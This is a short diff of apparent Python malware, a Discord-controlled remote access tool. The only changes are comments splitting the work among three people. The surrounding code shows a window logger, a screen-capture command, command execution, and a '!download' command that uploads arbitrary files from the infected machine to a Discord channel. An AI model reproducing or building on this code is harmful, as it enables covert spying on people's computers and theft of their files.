@@ -1,3 +1,4 @@
+#dani tot regel 150
 import winreg
 import ctypes
 import sys
@@ -148,7 +149,7 @@ async def on_message(message):
             await message.channel.send("[*] Window logging for this session stopped")
             game = discord.Game(f"Window logging stopped")
             await client.change_presence(status=discord.Status.online, activity=game)
-
+#ahmet tot 256
         if message.content == "!screenshot":
             import os
             from mss import mss
@@ -253,7 +254,7 @@ async def on_message(message):
             else:
                 await message.channel.send("[*] Command not recognized or no output was obtained")
                 status = None
-
+#moustafa eind
         if message.content.startswith("!download"):
             file = discord.File(message.content[10:], filename=message.content[10:])
             await message.channel.send("[*] Command successfully executed", file=file)
